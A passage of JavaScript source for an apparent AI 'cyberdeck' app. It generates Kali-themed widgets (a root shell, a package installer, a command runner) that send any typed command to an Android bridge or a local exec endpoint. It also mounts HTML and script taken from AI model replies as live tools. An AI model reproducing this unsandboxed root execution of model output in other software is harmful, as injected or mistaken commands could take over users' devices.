                        <button onclick="checkNet()" style="background:rgba(139,0,255,0.15); border:1px solid #8b00ff; color:#d8b4fe; padding:10px 6px; border-radius:6px; font-size:13px; font-weight:700; cursor:pointer;">🌐 IFCONFIG</button>
                        <button onclick="speakMsg()" style="background:rgba(0,136,255,0.15); border:1px solid #0088ff; color:#93c5fd; padding:10px 6px; border-radius:6px; font-size:13px; font-weight:700; cursor:pointer;">🗣️ TTS SPEAK</button>
                    </div>
                    <div id="cc-log" style="background:rgba(0,0,0,0.65); border:1px solid rgba(0,240,255,0.25); border-radius:6px; padding:10px; font-size:13px; color:#00f0ff; min-height:56px; max-height:180px; overflow-y:auto; white-space:pre-wrap; line-height:1.45;">Ready for hardware commands.</div>
                </div>
                <script>
                    function log(m) { const el = document.getElementById('cc-log'); el.textContent = '> ' + m; el.scrollTop = el.scrollHeight; }
                    function getB() { return (window.parent && window.parent.AndroidBridge) ? window.parent.AndroidBridge : (window.AndroidBridge || null); }
                    function scanWifi() {
                        log('Scanning wireless RF spectrum via wlan0...');
                        const b = getB();
                        if (b && b.scanWifiNetworks) { log(b.scanWifiNetworks()); }
                        else if (b && b.runShellCommand) { log(b.runShellCommand('wifi scan')); }
                        else {
                            fetch('http://127.0.0.1:8765/api/exec', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd:'iwlist scan 2>/dev/null || ip -br link'})})
                            .then(r => r.json()).then(d => log(d.output || d.stdout))
                            .catch(e => log('Bridge offline: ' + e));
                        }
                    }
                    let torchState = false;
                    function toggleTorch() {
                        const b = getB();
                        torchState = !torchState;
                        if (b && b.toggleFlashlight) { b.toggleFlashlight(torchState); log('Camera torch toggled: ' + (torchState ? 'ON' : 'OFF')); }
                        else if (b && b.runShellCommand) { log(b.runShellCommand(torchState ? 'torch on' : 'torch off')); }
                        else { log('Torch state: ' + (torchState ? 'ON' : 'OFF')); }
                    }
                    function vibe() {
                        const b = getB();
                        if (b && b.vibrate) b.vibrate(75);
                        log('Delivered 75ms haptic pulse.');
                    }
                    function checkBatt() {
                        const b = getB();
                        if (b && b.getBatteryLevel) {
                            const lvl = b.getBatteryLevel();
                            const chg = b.isDeviceCharging ? b.isDeviceCharging() : false;
                            log('Battery Level: ' + lvl + '% | Charging: ' + (chg ? 'YES' : 'NO'));
                        } else if (b && b.runShellCommand) {
                            log(b.runShellCommand('battery'));
                        } else {
                            log('Battery API active on Android host.');
                        }
                    }
                    function checkNet() {
                        const b = getB();
                        if (b && b.getNetworkInterfacesInfo) { log(b.getNetworkInterfacesInfo()); }
                        else if (b && b.runShellCommand) { log(b.runShellCommand('ifconfig')); }
                        else {
                            fetch('http://127.0.0.1:8765/api/exec', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd:'ip -br addr'})})
                            .then(r => r.json()).then(d => log(d.output || d.stdout))
                            .catch(e => log('Bridge offline: ' + e));
                        }
                    }
                    function speakMsg() {
                        const b = getB();
                        if (b && b.speakText) { b.speakText('Agentic Cyberdeck systems fully operational.'); log('TTS output triggered.'); }
                        else { log('Speech synthesis active.'); }
                    }
                </script>
            `
        };
    }

    // 2. Kali Linux Cyberdeck Shell
    if (q.includes('kali') || q.includes('terminal') || q.includes('command line') || q.includes('shell') || q.includes('bash')) {
        return {
            id: toolId,
            title: '💻 KALI LINUX CYBERDECK SHELL // ROOT',
            html: `
                <div style="background:rgba(2,5,12,0.85); border:1px solid rgba(0,240,255,0.3); border-radius:6px; overflow:hidden; font-family:'JetBrains Mono',monospace;">
                    <div style="background:rgba(10,18,36,0.9); padding:8px 12px; border-bottom:1px solid rgba(0,240,255,0.2); display:flex; justify-content:space-between; font-size:12.5px; color:#cbd5e1;">
                        <span style="color:#00f0ff; font-weight:700;">⚡ KALI NETHUNTER (nh -r) // ROOT CONSOLE</span>
                        <span style="color:#ff007f;">UID 0</span>
                    </div>
                    <div id="t-out" style="height:160px; overflow-y:auto; padding:10px; font-size:13px; color:#00ff88; white-space:pre-wrap; line-height:1.45; background:rgba(0,0,0,0.55);">Kali GNU/Linux Rolling (arm64) • Root active\nTap any shortcut chip below or enter any bash command:</div>
                    <div style="display:flex; gap:6px; padding:8px; background:rgba(5,11,24,0.7); overflow-x:auto; border-top:1px solid rgba(0,240,255,0.15);">
                        <button onclick="sendQuick('whoami && id')" style="background:rgba(0,240,255,0.15); border:1px solid #00f0ff; color:#00f0ff; padding:4px 8px; font-size:12px; border-radius:4px; cursor:pointer;">id</button>
                        <button onclick="sendQuick('uname -a')" style="background:rgba(0,240,255,0.15); border:1px solid #00f0ff; color:#00f0ff; padding:4px 8px; font-size:12px; border-radius:4px; cursor:pointer;">uname</button>
                        <button onclick="sendQuick('ifconfig')" style="background:rgba(0,240,255,0.15); border:1px solid #00f0ff; color:#00f0ff; padding:4px 8px; font-size:12px; border-radius:4px; cursor:pointer;">ifconfig</button>
                        <button onclick="sendQuick('ps aux | head -n 12')" style="background:rgba(0,240,255,0.15); border:1px solid #00f0ff; color:#00f0ff; padding:4px 8px; font-size:12px; border-radius:4px; cursor:pointer;">ps</button>
                        <button onclick="sendQuick('nmap --version 2>/dev/null || which nmap')" style="background:rgba(255,0,127,0.15); border:1px solid #ff007f; color:#ff007f; padding:4px 8px; font-size:12px; border-radius:4px; cursor:pointer;">nmap</button>
                        <button onclick="sendQuick('df -h /root')" style="background:rgba(255,183,0,0.15); border:1px solid #ffb700; color:#ffb700; padding:4px 8px; font-size:12px; border-radius:4px; cursor:pointer;">storage</button>
                    </div>
                    <div style="display:flex; gap:6px; padding:8px; background:rgba(10,18,36,0.85); border-top:1px solid rgba(0,240,255,0.2);">
                        <input id="t-in" placeholder="Enter root command (e.g. nmap, ping, ls)..." style="flex:1; background:transparent; border:none; color:#FFF; font-family:'JetBrains Mono',monospace; font-size:13px; outline:none; padding:4px 6px;" />
                        <button onclick="runCmd()" style="background:linear-gradient(90deg, #00f0ff, #ff007f); color:#000; padding:6px 14px; font-size:13px; font-weight:800; border-radius:4px; border:none; cursor:pointer;">RUN</button>
                    </div>
                </div>
                <script>
                    const out = document.getElementById('t-out');
                    const inp = document.getElementById('t-in');
                    function getBridge() { return (window.parent && window.parent.AndroidBridge) ? window.parent.AndroidBridge : (window.AndroidBridge || null); }
                    function sendQuick(c) { inp.value = c; runCmd(); }
                    function runCmd() {
                        const c = inp.value.trim();
                        if (!c) return;
                        inp.value = '';
                        out.textContent += '\\n# ' + c + '\\n';
                        out.scrollTop = out.scrollHeight;

                        const b = getBridge();
                        if (b && b.runShellCommand) {
                            const res = b.runShellCommand(c);
                            out.textContent += (res ? res.trim() : '(No output)') + '\\n';
                            out.scrollTop = out.scrollHeight;
                        } else {
                            fetch('http://127.0.0.1:8765/api/exec', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({ cmd: c })
                            }).then(r => r.json()).then(d => {
                                out.textContent += (d.output || d.stdout || ('Exit code: ' + d.exit_code)) + '\\n';
                                out.scrollTop = out.scrollHeight;
                            }).catch(e => {
                                out.textContent += 'Bridge connection error: ' + e + '\\n';
                                out.scrollTop = out.scrollHeight;
                            });
                        }
                    }
                    inp.addEventListener('keydown', e => { if (e.key === 'Enter') runCmd(); });
                </script>
            `
        };
    }

    // 3. Kali Package & Tool Downloader
    if (q.includes('download') || q.includes('package') || q.includes('installer') || q.includes('install tool') || q.includes('apt') || q.includes('pip')) {
        return {
            id: toolId,
            title: '📦 KALI PACKAGE & TOOL INSTALLER',
            html: `
                <div style="background:rgba(2,5,12,0.85); border:1px solid rgba(255,183,0,0.35); border-radius:6px; padding:12px; font-family:'JetBrains Mono',monospace;">
                    <div style="color:#ffb700; font-weight:700; font-size:13.5px; margin-bottom:6px;">KALI NETHUNTER TOOL DOWNLOADER</div>
                    <div style="font-size:12px; color:#cbd5e1; margin-bottom:12px;">Install penetration testing utilities, security tools, and python packages directly into NetHunter root.</div>
                    <div style="display:flex; gap:8px; margin-bottom:10px;">
                        <input id="pkg-name" placeholder="Package name (e.g. nmap, tshark, tcpdump)..." value="nmap" style="flex:1; background:rgba(0,0,0,0.5); border:1px solid rgba(255,183,0,0.3); color:#fff; padding:8px 10px; font-size:13px; border-radius:6px; outline:none; font-family:inherit;" />
                        <select id="pkg-type" style="background:rgba(10,18,36,0.9); border:1px solid rgba(255,183,0,0.3); color:#ffb700; font-family:inherit; font-size:13px; border-radius:6px; padding:0 8px;">
                            <option value="apt">APT</option>
                            <option value="pip">PIP</option>
                        </select>
                        <button onclick="installPkg()" style="background:#ffb700; color:#000; font-weight:800; border:none; padding:8px 14px; font-size:13px; border-radius:6px; cursor:pointer;">INSTALL</button>
                    </div>
                    <div style="display:flex; gap:6px; margin-bottom:10px; flex-wrap:wrap; align-items:center;">
                        <span style="font-size:12px; color:#64748b;">Quick select:</span>
                        <button onclick="setPkg('nmap','apt')" style="background:rgba(255,255,255,0.08); border:none; color:#00f0ff; padding:4px 8px; font-size:12px; border-radius:4px; cursor:pointer;">nmap</button>
                        <button onclick="setPkg('tcpdump','apt')" style="background:rgba(255,255,255,0.08); border:none; color:#00f0ff; padding:4px 8px; font-size:12px; border-radius:4px; cursor:pointer;">tcpdump</button>
                        <button onclick="setPkg('tshark','apt')" style="background:rgba(255,255,255,0.08); border:none; color:#00f0ff; padding:4px 8px; font-size:12px; border-radius:4px; cursor:pointer;">tshark</button>
                        <button onclick="setPkg('netcat-traditional','apt')" style="background:rgba(255,255,255,0.08); border:none; color:#00f0ff; padding:4px 8px; font-size:12px; border-radius:4px; cursor:pointer;">netcat</button>
                        <button onclick="setPkg('requests','pip')" style="background:rgba(255,255,255,0.08); border:none; color:#ff007f; padding:4px 8px; font-size:12px; border-radius:4px; cursor:pointer;">pip:requests</button>
                    </div>
                    <pre id="pkg-log" style="background:rgba(0,0,0,0.6); padding:10px; border-radius:6px; font-size:13px; color:#ffb700; max-height:160px; overflow-y:auto; border:1px solid rgba(255,183,0,0.2);">Standby for package installation.</pre>
                </div>
                <script>
                    function setPkg(n, t) { document.getElementById('pkg-name').value = n; document.getElementById('pkg-type').value = t; }
                    function installPkg() {
                        const pkg = document.getElementById('pkg-name').value.trim();
                        const type = document.getElementById('pkg-type').value;
                        const log = document.getElementById('pkg-log');
                        if (!pkg) return;
                        log.textContent = 'Installing ' + pkg + ' via ' + type.toUpperCase() + ' in Kali NetHunter...\\n(This may take a minute)\\n';

                        const b = (window.parent && window.parent.AndroidBridge) ? window.parent.AndroidBridge : (window.AndroidBridge || null);
                        if (b && b.installNetHunterPackage) {
                            const res = b.installNetHunterPackage(type, pkg);
                            log.textContent += res;
                        } else if (b && b.runShellCommand) {
                            const cmd = type === 'pip' ? ('pip install ' + pkg) : ('DEBIAN_FRONTEND=noninteractive apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y ' + pkg);
                            log.textContent += b.runShellCommand(cmd);
                        } else {
                            fetch('http://127.0.0.1:8765/api/install', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({ package: pkg, type: type })
                            }).then(r => r.json()).then(d => {
                                log.textContent += d.log || (d.success ? 'Installation completed.' : 'Install failed.');
                            }).catch(e => {
                                log.textContent += 'Bridge connection error: ' + e;
                            });
                        }
                    }
                </script>
            `
        };
    }

    // 4. Quantum Scientific Calculator
    if (q.includes('calc') || q.includes('math')) {
        return {
            id: toolId,
            title: '🧮 HOLOGRAPHIC QUANTUM CALCULATOR',
            html: `
                <div style="max-width:280px; margin:0 auto; background:rgba(8,14,28,0.7); padding:12px; border-radius:8px; border:1px solid rgba(0,240,255,0.3); font-family:'JetBrains Mono',monospace;">
                    <input id="calc-disp" readonly value="0" style="width:100%; text-align:right; font-size:18px; padding:8px; margin-bottom:8px; background:rgba(0,0,0,0.6); color:#00f0ff; border:1px solid rgba(0,240,255,0.3); font-family:inherit; border-radius:4px;" />
                    <div style="display:grid; grid-template-columns:repeat(4, 1fr); gap:4px;">
                        <button onclick="cClear()" style="background:#ff007f; color:#FFF; padding:8px; border-radius:4px; font-weight:bold; border:none; cursor:pointer;">C</button>
                        <button onclick="cOp('/')" style="background:rgba(0,240,255,0.15); color:#00f0ff; padding:8px; border-radius:4px; border:none; cursor:pointer;">/</button>
                        <button onclick="cOp('*')" style="background:rgba(0,240,255,0.15); color:#00f0ff; padding:8px; border-radius:4px; border:none; cursor:pointer;">*</button>
                        <button onclick="cOp('-')" style="background:rgba(0,240,255,0.15); color:#00f0ff; padding:8px; border-radius:4px; border:none; cursor:pointer;">-</button>
                        <button onclick="cNum('7')" style="background:rgba(255,255,255,0.06); color:#FFF; padding:8px; border-radius:4px; border:none; cursor:pointer;">7</button>
                        <button onclick="cNum('8')" style="background:rgba(255,255,255,0.06); color:#FFF; padding:8px; border-radius:4px; border:none; cursor:pointer;">8</button>
                        <button onclick="cNum('9')" style="background:rgba(255,255,255,0.06); color:#FFF; padding:8px; border-radius:4px; border:none; cursor:pointer;">9</button>
                        <button onclick="cOp('+')" style="background:rgba(0,240,255,0.15); color:#00f0ff; padding:8px; border-radius:4px; border:none; cursor:pointer;">+</button>
                        <button onclick="cNum('4')" style="background:rgba(255,255,255,0.06); color:#FFF; padding:8px; border-radius:4px; border:none; cursor:pointer;">4</button>
                        <button onclick="cNum('5')" style="background:rgba(255,255,255,0.06); color:#FFF; padding:8px; border-radius:4px; border:none; cursor:pointer;">5</button>
                        <button onclick="cNum('6')" style="background:rgba(255,255,255,0.06); color:#FFF; padding:8px; border-radius:4px; border:none; cursor:pointer;">6</button>
                        <button onclick="cCalc()" style="background:#00f0ff; color:#000; padding:8px; grid-row:span 2; font-weight:800; border-radius:4px; border:none; cursor:pointer;">=</button>
                        <button onclick="cNum('1')" style="background:rgba(255,255,255,0.06); color:#FFF; padding:8px; border-radius:4px; border:none; cursor:pointer;">1</button>
                        <button onclick="cNum('2')" style="background:rgba(255,255,255,0.06); color:#FFF; padding:8px; border-radius:4px; border:none; cursor:pointer;">2</button>
                        <button onclick="cNum('3')" style="background:rgba(255,255,255,0.06); color:#FFF; padding:8px; border-radius:4px; border:none; cursor:pointer;">3</button>
                        <button onclick="cNum('0')" style="background:rgba(255,255,255,0.06); color:#FFF; padding:8px; grid-column:span 2; border-radius:4px; border:none; cursor:pointer;">0</button>
                        <button onclick="cNum('.')" style="background:rgba(255,255,255,0.06); color:#FFF; padding:8px; border-radius:4px; border:none; cursor:pointer;">.</button>
                    </div>
                </div>
                <script>
                    const d = document.getElementById('calc-disp');
                    function cNum(n) { if (d.value === '0') d.value = n; else d.value += n; }
                    function cOp(o) { d.value += o; }
                    function cClear() { d.value = '0'; }
                    function cCalc() { try { d.value = Function('"use strict";return (' + d.value + ')')(); } catch(e) { d.value = 'Err'; } }
                </script>
            `
        };
    }

    // 5. Universal Dynamic Cyberdeck Tool & Script Runner
    const defaultCmd = q.includes('wifi') ? 'wifi scan' : (q.includes('ip') || q.includes('network') ? 'ifconfig' : 'uname -a && id && uptime');
    return {
        id: toolId,
        title: `⚡ ${query.toUpperCase().replace(/^\/SYNTH\s*/i, '').slice(0, 32)} // CYBERDECK RUNNER`,
        html: `
            <div style="background:rgba(2,5,14,0.9); border:1px solid #00f0ff; border-radius:6px; padding:12px; font-family:'JetBrains Mono',monospace;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
                    <span style="color:#00f0ff; font-weight:700; font-size:13px;">HOLOGRAPHIC TOOL RUNNER</span>
                    <span style="color:#00ff88; font-size:12px;">NETHUNTER ROOT // LIVE</span>
                </div>
                <div style="display:grid; grid-template-columns:repeat(4, 1fr); gap:6px; margin-bottom:10px;">
                    <button onclick="setAndRun('wifi scan')" style="background:rgba(0,240,255,0.12); border:1px solid rgba(0,240,255,0.4); color:#00f0ff; padding:8px 4px; border-radius:4px; font-size:12px; font-weight:700; cursor:pointer;">📡 WI-FI</button>
                    <button onclick="setAndRun('ifconfig')" style="background:rgba(139,0,255,0.15); border:1px solid rgba(139,0,255,0.4); color:#d8b4fe; padding:8px 4px; border-radius:4px; font-size:12px; font-weight:700; cursor:pointer;">🌐 NET</button>
                    <button onclick="setAndRun('ping -c 3 8.8.8.8')" style="background:rgba(0,255,136,0.12); border:1px solid rgba(0,255,136,0.4); color:#00ff88; padding:8px 4px; border-radius:4px; font-size:12px; font-weight:700; cursor:pointer;">📶 PING</button>
                    <button onclick="setAndRun('free -m && df -h /')" style="background:rgba(255,183,0,0.12); border:1px solid rgba(255,183,0,0.4); color:#ffb700; padding:8px 4px; border-radius:4px; font-size:12px; font-weight:700; cursor:pointer;">📊 MEM</button>
                </div>
                <div style="display:flex; gap:8px; margin-bottom:10px;">
                    <input id="dyn-cmd" value="${escapeHtmlAttr(defaultCmd)}" style="flex:1; background:rgba(0,0,0,0.6); border:1px solid rgba(0,240,255,0.3); color:#fff; padding:8px 10px; font-size:13px; border-radius:6px; outline:none; font-family:inherit;" />
                    <button onclick="execDyn()" style="background:#00f0ff; color:#000; font-weight:800; border:none; padding:8px 14px; font-size:13px; border-radius:6px; cursor:pointer;">RUN</button>
                </div>
                <pre id="dyn-out" style="background:rgba(0,0,0,0.75); padding:10px; border-radius:6px; font-size:13px; color:#00ff88; max-height:170px; overflow-y:auto; border:1px solid rgba(0,240,255,0.25);">Ready for commands.</pre>
            </div>
            <script>
                function setAndRun(cmd) {
                    document.getElementById('dyn-cmd').value = cmd;
                    execDyn();
                }
                function execDyn() {
                    const c = document.getElementById('dyn-cmd').value.trim();
                    const out = document.getElementById('dyn-out');
                    if (!c) return;
                    out.textContent = 'Running: ' + c + '\\n...\\n';
                    const b = (window.parent && window.parent.AndroidBridge) ? window.parent.AndroidBridge : (window.AndroidBridge || null);
                    if (b && b.runShellCommand) {
                        out.textContent = b.runShellCommand(c) || '(Completed with no output)';
                    } else {
                        fetch('http://127.0.0.1:8765/api/exec', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ cmd: c })
                        }).then(r => r.json()).then(d => {
                            out.textContent = d.output || d.stdout || ('Exit code: ' + d.exit_code);
                        }).catch(e => { out.textContent = 'Error: ' + e; });
                    }
                }
            </script>
        `
    };
}

// ===================== 8. EXTRACT HTML FROM AI =====================
function extractHtmlTool(text, userQuery = '') {
    if (!text) return { cleanText: text, toolObj: null };

    let rawHtml = '';
    let matchedBlock = null;

    // 1. Try explicit ```html ... ``` (with or without newline after tag)
    const htmlBlockRegex = /```(?:html|htm|xml|svg|webapp|ui)?\s*([\s\S]*?)```/gi;
    let bMatch;
    while ((bMatch = htmlBlockRegex.exec(text)) !== null) {
        const candidate = bMatch[1].trim();
        if (candidate.includes('<') && (
            candidate.includes('<!DOCTYPE') ||
            candidate.includes('<html') ||
            candidate.includes('<body') ||
            candidate.includes('<div') ||
            candidate.includes('<button') ||
            candidate.includes('<canvas') ||
            candidate.includes('<style') ||
            candidate.includes('<script') ||
            candidate.includes('<table') ||
            candidate.includes('<form')
        )) {
            rawHtml = candidate;
            matchedBlock = bMatch[0];
            break;
        }
    }

    // 2. Search for raw full HTML document not wrapped in code fences
    if (!rawHtml) {
        const docMatch = text.match(/(<!DOCTYPE\s+html[\s\S]*?<\/html>)/i) || text.match(/(<html[\s\S]*?<\/html>)/i);
        if (docMatch) {
            rawHtml = docMatch[1].trim();
            matchedBlock = docMatch[0];
        }
    }

    if (!rawHtml) return { cleanText: text, toolObj: null };

    // Clean out the raw HTML block so it does not render as a duplicate code block!
    let cleanText = matchedBlock ? text.replace(matchedBlock, '').trim() : text.replace(rawHtml, '').trim();
    if (!cleanText) {
        cleanText = "Synthesized application mounted below:";
    }

    // Determine smart descriptive title
    let title = '⚡ SYNTHESIZED TOOL';
    const q = (userQuery + ' ' + cleanText + ' ' + rawHtml.slice(0, 300)).toLowerCase();
    if (q.includes('calc') || q.includes('math')) title = '🧮 HOLOGRAPHIC CALCULATOR';
    else if (q.includes('kali') || q.includes('terminal') || q.includes('shell')) title = '💻 KALI CYBERDECK TERMINAL';
    else if (q.includes('command center') || q.includes('control phone') || q.includes('hardware hud')) title = '📱 ANDROID COMMAND CENTER';
    else if (q.includes('calendar')) title = '📅 QUANTUM CALENDAR';
    else if (q.includes('timer') || q.includes('clock') || q.includes('chronometer')) title = '⏱️ PRECISION CHRONOMETER';
    else if (q.includes('wifi') || q.includes('spectrum') || q.includes('network')) title = '📡 SPECTRUM & NETWORK TOOL';
    else if (q.includes('weather')) title = '🌤️ QUANTUM WEATHER STATION';
    else if (q.includes('diag') || q.includes('resource') || q.includes('monitor')) title = '📊 SYSTEM RESOURCE MONITOR';
    else if (q.includes('speedtest') || q.includes('bandwidth')) title = '🚀 NETWORK SPEED ANALYZER';
    else if (q.includes('port') || q.includes('scanner')) title = '🔍 PORT & SERVICE SCANNER';
    else if (userQuery) {
        const cleanQ = userQuery.replace(/^\/synth\w*\s*/i, '').replace(/\b(synthesize|synthazize|synthesise|build|create|make)\b/gi, '').trim();
        if (cleanQ) {
            title = `⚡ ${cleanQ.toUpperCase().slice(0, 30)} // SYNTHESIZED TOOL`;
        }
    }

    return {
        cleanText,
        toolObj: {
            id: 'dyn_' + Math.random().toString(36).substr(2, 9),
            title,
            html: rawHtml
        }
    };
}

// ===================== 9. AI PROVIDERS =====================
async function queryAIProvider(messages) {
    if (state.provider === 'gemini') {
        return await queryGemini(messages);
    } else if (state.provider === 'groq') {
        return await queryOpenAICompatible("https://api.groq.com/openai/v1/chat/completions", state.apiKey, messages);
    } else if (state.provider === 'openrouter') {
        return await queryOpenAICompatible("https://openrouter.ai/api/v1/chat/completions", state.apiKey, messages);
    } else if (state.provider === 'ollama') {
        const base = state.customUrl || "http://127.0.0.1:11434";
        return await queryOllama(base, messages);
    }
    throw new Error("Unsupported provider: " + state.provider);
}

async function queryGemini(messages) {
    const key = (state.apiKey || '').replace(/^["']|["']$/g, '').trim();
    if (!key) throw new Error("Enter your Gemini API key in Routing & Settings.");

    const sanitizedContents = [];
    let sysInstruction = null;

    for (const m of messages) {
        if (m.role === 'system') {
            sysInstruction = { parts: [{ text: m.content }] };
            continue;
        }
        const role = (m.role === 'model' || m.role === 'assistant') ? 'model' : 'user';
        const text = (m.content || '').trim();
        if (!text) continue;

        if (sanitizedContents.length > 0 && sanitizedContents[sanitizedContents.length - 1].role === role) {
            sanitizedContents[sanitizedContents.length - 1].parts[0].text += "\n\n" + text;
        } else {
            sanitizedContents.push({
                role: role,
                parts: [{ text: text }]
            });
        }
    }

    // Ensure contents starts with 'user' for strict Gemini turn order
    if (sanitizedContents.length > 0 && sanitizedContents[0].role !== 'user') {
        sanitizedContents.unshift({ role: 'user', parts: [{ text: 'Initiating session.' }] });
    }
    if (sanitizedContents.length === 0) {
        sanitizedContents.push({ role: 'user', parts: [{ text: 'Hello.' }] });
    }

    const payload = {
        contents: sanitizedContents,
        generationConfig: {
            temperature: 0.7,
            maxOutputTokens: 2048
        }
    };
    if (sysInstruction) payload.systemInstruction = sysInstruction;

    const userModel = (state.model || 'gemini-2.5-flash').replace(/^["']|["']$/g, '').trim().replace(/^models\//, '');
    const candidateModels = [
        userModel,
        'gemini-2.5-flash',
        'gemini-2.0-flash',
        'gemini-1.5-flash',
        'gemini-2.5-pro',
        'gemini-3.8-flash',
        'gemini-3.5-flash-lite',
        'gemini-3.5-flash',
        'gemini-3.1-pro-preview'
    ];
    let uniqueModels = [...new Set(candidateModels.filter(Boolean))];
    let lastError = null;
    let attemptedAutoDiscovery = false;

    for (let idx = 0; idx < uniqueModels.length; idx++) {
        const rawModel = uniqueModels[idx];
        const modelName = rawModel.trim().replace(/^models\//, '');
        
        for (const ver of ['v1beta', 'v1']) {
            const endpoint = `https://generativelanguage.googleapis.com/${ver}/models/${modelName}:generateContent?key=${encodeURIComponent(key)}`;
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 25000);
            try {
                const res = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    signal: controller.signal
                });
                clearTimeout(timeoutId);

                if (!res.ok) {
                    const errJson = await res.json().catch(() => ({}));
                    const errMsg = (errJson.error && errJson.error.message) ? errJson.error.message : `HTTP ${res.status}`;
                    lastError = new Error(`Gemini (${modelName}): ${errMsg}`);
                    if (errMsg.includes('API key not valid') || errMsg.includes('API_KEY_INVALID')) {
                        throw new Error(`Google API key is not valid: ${errMsg}. Please enter a valid Gemini API key in Settings.`);
                    }
                    if (res.status === 429) {
                        throw new Error(`Google Gemini quota or rate limit exceeded: ${errMsg}`);
                    }
                    
                    if ((res.status === 404 || res.status === 400) && !attemptedAutoDiscovery) {
                        attemptedAutoDiscovery = true;
                        try {
                            const discovered = await fetchLiveGoogleModels(key);
                            if (discovered && discovered.length > 0) {
                                const newModels = discovered.map(d => d.id).filter(id => !uniqueModels.includes(id));
                                if (newModels.length > 0) {
                                    uniqueModels.splice(idx + 1, 0, ...newModels);
                                    if (idx === 0) {
                                        state.model = newModels[0];
                                        localStorage.setItem('ae_model', state.model);
                                        const mInput = document.getElementById('modelInput');
                                        if (mInput) mInput.value = state.model;
                                    }
                                }
                            }
                        } catch (discErr) {
                            console.warn("[Auto-Discovery]", discErr);
                        }
                    }

                    if (res.status === 404 || res.status === 403 || res.status === 400) {
                        continue;
                    }
                    throw lastError;
                }

                const data = await res.json();
                const replyText = data?.candidates?.[0]?.content?.parts?.[0]?.text;
                if (replyText) {
                    if (modelName !== userModel) {
                        state.model = modelName;
                        localStorage.setItem('ae_model', modelName);
                        const mInput = document.getElementById('modelInput');
                        if (mInput) mInput.value = modelName;
                    }
                    return replyText.trim();
                } else if (data?.candidates?.[0]?.finishReason) {
                    return `[Gemini finished with reason: ${data.candidates[0].finishReason}]`;
                } else {
                    throw new Error("Gemini returned empty response");
                }
            } catch (e) {
                clearTimeout(timeoutId);
                lastError = e;
                if (e.name === 'AbortError') {
                    lastError = new Error(`Gemini request timed out on model ${modelName}`);
                }
                if (e.message && (e.message.includes('API key is not valid') || e.message.includes('quota or rate limit exceeded'))) {
                    throw e;
                }
            }
        }
    }
    throw new Error(`Google Gemini could not connect using model '${userModel}'. ${lastError ? lastError.message : 'Please check your API key and verify permitted models in Google AI Studio.'}`);
}

async function queryOpenAICompatible(url, key, messages) {
    const cleanKey = (key || '').replace(/^["']|["']$/g, '').trim();
    const cleanModel = (state.model || 'llama-3.3-70b-versatile').replace(/^["']|["']$/g, '').trim();
    const formatted = messages.map(m => ({
        role: (m.role === 'model' || m.role === 'assistant') ? 'assistant' : m.role,
        content: m.content || ''
    }));
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 25000);
    try {
        const res = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${cleanKey}`
            },
            body: JSON.stringify({ model: cleanModel, messages: formatted }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);

        if (!res.ok) {
            const errJson = await res.json().catch(() => ({}));
            throw new Error(errJson.error?.message || `HTTP ${res.status}`);
        }

        const data = await res.json();
        return data.choices?.[0]?.message?.content || "No response received";
    } catch (e) {
        clearTimeout(timeoutId);
        throw e;
    }
}

async function queryOllama(base, messages) {
    let ollamaModel = (state.model && !state.model.startsWith('gemini')) ? state.model : 'llama3:latest';
    const bases = [
        base,
        state.customUrl,
        'http://127.0.0.1:11434',
        'http://localhost:11434',
        'http://10.0.2.2:11434'
    ].filter(Boolean);
    const uniqueBases = [...new Set(bases.map(b => b.replace(/\/+$/, '')))];

    let lastErr = null;
    for (const b of uniqueBases) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 35000);

            const res = await fetch(`${b}/api/chat`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    model: ollamaModel,
                    messages: messages.map(m => ({
                        role: (m.role === 'model' || m.role === 'assistant') ? 'assistant' : m.role,
                        content: m.content || ''
                    })),
                    stream: false
                }),
                signal: controller.signal
            });
            clearTimeout(timeoutId);

            if (res.ok) {
                const data = await res.json();
                const reply = data?.message?.content || data?.response;
                if (reply) {
                    if (b !== state.customUrl) {
                        state.customUrl = b;
                        localStorage.setItem('ae_custom_url', b);
                    }
                    return reply.trim();
                }
            } else if (res.status === 404) {
                const tagRes = await fetch(`${b}/api/tags`).catch(() => null);
                if (tagRes && tagRes.ok) {
                    const tagData = await tagRes.json().catch(() => ({}));
                    if (Array.isArray(tagData.models) && tagData.models.length > 0) {
                        const avail = tagData.models[0].name || tagData.models[0].model;
                        if (avail && avail !== ollamaModel) {
                            ollamaModel = avail;
                            state.model = avail;
                            localStorage.setItem('ae_model', avail);
                            const retryRes = await fetch(`${b}/api/chat`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    model: ollamaModel,
                                    messages: messages.map(m => ({
                                        role: (m.role === 'model' || m.role === 'assistant') ? 'assistant' : m.role,
                                        content: m.content || ''
                                    })),
                                    stream: false
                                })
                            });
                            if (retryRes.ok) {
                                const rData = await retryRes.json();
                                return (rData?.message?.content || rData?.response || '').trim();
                            }
                        }
                    }
                }
                lastErr = new Error(`Ollama model '${ollamaModel}' not found at ${b}`);
            } else {
                lastErr = new Error(`Ollama HTTP ${res.status} at ${b}`);
            }
        } catch (e) {
            lastErr = e;
        }
    }
    throw lastErr || new Error("Failed to connect to Ollama at " + (base || "127.0.0.1:11434"));
}

// ===================== 10. FORMATTING UTILITIES =====================
function escapeHtml(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

function escapeHtmlAttr(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
